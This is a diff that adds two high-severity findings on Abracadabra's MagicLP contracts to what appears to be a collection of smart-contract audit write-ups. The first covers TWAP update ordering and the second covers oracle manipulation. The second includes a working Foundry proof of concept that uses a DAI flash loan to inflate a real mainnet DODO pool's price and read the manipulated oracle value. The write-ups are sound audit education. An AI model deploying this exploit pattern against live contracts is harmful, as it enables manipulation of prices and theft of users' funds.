@@ -311,3 +311,160 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 3.[High] Anyone making use of the MagicLP’s TWAP to determine token prices will be exploitable.
+
+### TWAP updating mechanism
+
+- Summary: MagicLP's TWAP updating mechanism allows attackers to manipulate recorded prices by inflating reserves before a query, resulting in potentially exploitative trading conditions for unsuspecting users. This can lead to significant profit for attackers who exploit the manipulated prices during trading activities, posing a risk to any application relying on MagicLP’s TWAP for token price determination.
+
+- Impact & Recommendation: `_twapUpdate()` needs to be called before reserves are updated.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-abracadabra-money#h-01-anyone-making-use-of-the-magiclps-twap-to-determine-token-prices-will-be-exploitable) & [Report](https://code4rena.com/reports/2024-03-abracadabra-money)
+
+<details><summary>POC</summary>
+
+```solidity
+    function _twapUpdate() internal {
+        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
+        uint32 timeElapsed = blockTimestamp - _BLOCK_TIMESTAMP_LAST_;
+        if (timeElapsed > 0 && _BASE_RESERVE_ != 0 && _QUOTE_RESERVE_ != 0) {
+            /// @dev It is desired and expected for this value to
+            /// overflow once it has hit the max of `type.uint256`.
+            unchecked {
+                _BASE_PRICE_CUMULATIVE_LAST_ += getMidPrice() * timeElapsed;
+            }
+        }
+        _BLOCK_TIMESTAMP_LAST_ = blockTimestamp;
+    }
+
+    function _resetTargetAndReserve() internal returns (uint256 baseBalance, uint256 quoteBalance) {
+        baseBalance = _BASE_TOKEN_.balanceOf(address(this));
+        quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));
+        if (baseBalance > type(uint112).max || quoteBalance > type(uint112).max) {
+            revert ErrOverflow();
+        }
+        _BASE_RESERVE_ = uint112(baseBalance);
+        _QUOTE_RESERVE_ = uint112(quoteBalance);
+        _BASE_TARGET_ = uint112(baseBalance);
+        _QUOTE_TARGET_ = uint112(quoteBalance);
+        _RState_ = uint32(PMMPricing.RState.ONE);
+        _twapUpdate();
+    }
+    function _setReserve(uint256 baseReserve, uint256 quoteReserve) internal {
+        _BASE_RESERVE_ = baseReserve.toUint112();
+        _QUOTE_RESERVE_ = quoteReserve.toUint112();
+        _twapUpdate();
+    }
+
+
+```
+
+</details>
+
+## 4.[High] Oracle price can be manipulated
+
+### Oracle price
+
+- Summary: MagicLpAggregator allows attackers to manipulate pair token prices by inflating reserve values. For example, an attacker can use a flash loan to inflate the pair price, which can deceive users relying on the oracle's price information, leading to potential financial losses.
+
+- Impact & Recommendation: Consider add a sanity check in MagicLpAggregator to compare base and quote token prices with the Chainlink price feed.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-abracadabra-money#h-04-oracle-price-can-be-manipulated) & [Report](https://code4rena.com/reports/2024-03-abracadabra-money)
+
+<details><summary>POC</summary>
+
+```solidity
+    // SPDX-License-Identifier: UNLICENSED
+    pragma solidity ^0.8.13;
+    import "utils/BaseTest.sol";
+    import "oracles/aggregators/MagicLpAggregator.sol";
+    // import "forge-std/console2.sol";
+    interface IDodo {
+        function getVaultReserve() external view returns (uint256 baseReserve, uint256 quoteReserve);
+        function _QUOTE_TOKEN_() external view returns (address);
+        function sellBase(address to) external returns (uint256);
+        function sellQuote(address to) external returns (uint256);
+    }
+    interface IFlashMinter {
+        function flashLoan(address, address, uint256, bytes memory) external;
+    }
+    contract MagicLpAggregatorExt is MagicLpAggregator {
+        constructor(
+            IMagicLP pair_,
+            IAggregator baseOracle_,
+            IAggregator quoteOracle_
+        ) MagicLpAggregator(pair_, baseOracle_, quoteOracle_) {}
+        function _getReserves() internal view override returns (uint256, uint256) {
+            return IDodo(address(pair)).getVaultReserve();
+        }
+    }
+    contract Borrower {
+        IFlashMinter private immutable minter;
+        IDodo private immutable dodoPool;
+        MagicLpAggregator private immutable oracle;
+        constructor(address _minter, address _dodoPool, address _oracle) {
+            minter = IFlashMinter(_minter);
+            dodoPool = IDodo(_dodoPool);
+            oracle = MagicLpAggregator(_oracle);
+        }
+        /// Initiate a flash loan
+        function flashBorrow(address token, uint256 amount) public {
+            IERC20Metadata(token).approve(address(minter), ~uint256(0));
+            minter.flashLoan(address(this), token, amount, "");
+        }
+        /// ERC-3156 Flash loan callback
+        function onFlashLoan(
+            address initiator,
+            address token, // DAI
+            uint256 amount,
+            uint256 fee,
+            bytes calldata data
+        ) external returns (bytes32) {
+            // tamper with the DAI/USDT pool
+            IERC20Metadata(token).transfer(address(dodoPool), amount);
+            dodoPool.sellBase(address(this));
+            IERC20Metadata quote = IERC20Metadata(dodoPool._QUOTE_TOKEN_());
+            uint256 quoteAmount = quote.balanceOf(address(this));
+            // pair price after tampering
+            uint256 response = uint256(oracle.latestAnswer());
+            console.log("BAD ANSWER: ", response);
+            // Do something evil here
+            // swap tokens back and repay the loan
+            address(quote).call{value: 0}(abi.encodeWithSignature("transfer(address,uint256)", address(dodoPool), quoteAmount));
+            dodoPool.sellQuote(address(this));
+            IERC20Metadata(token).transfer(initiator, amount + fee);
+            return keccak256("ERC3156FlashBorrower.onFlashLoan");
+        }
+    }
+    contract MagicLpAggregatorTest is BaseTest {
+        MagicLpAggregatorExt aggregator;
+        address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+        address constant DAI_MINTER = 0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA;
+        address constant DODO_POOL = 0x3058EF90929cb8180174D74C507176ccA6835D73;
+        function setUp() public override {
+            fork(ChainId.Mainnet, 19365773);
+            _setUp();
+        }
+        function _setUp() public {
+            super.setUp();
+            aggregator = new MagicLpAggregatorExt(
+                IMagicLP(DODO_POOL),
+                IAggregator(0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9),
+                IAggregator(0x3E7d1eAB13ad0104d2750B8863b489D65364e32D)
+            );
+        }
+        function testGetResult() public {
+            uint256 response = uint256(aggregator.latestAnswer());
+            // pair price before ~ $2
+            assertEq(response, 2000502847471294054);
+            console.log("GOOD ANSWER: ", response);
+            // use DAI flash minter to inflate the pair price to $67
+            Borrower borrower = new Borrower(DAI_MINTER, DODO_POOL, address(aggregator));
+            deal(DAI, address(borrower), 1100 * 1e18);
+            IERC20Metadata(DAI).approve(address(borrower), type(uint256).max);
+            borrower.flashBorrow(DAI, 100_000_000 ether);
+        }
+    }
+
+```
+
+</details>
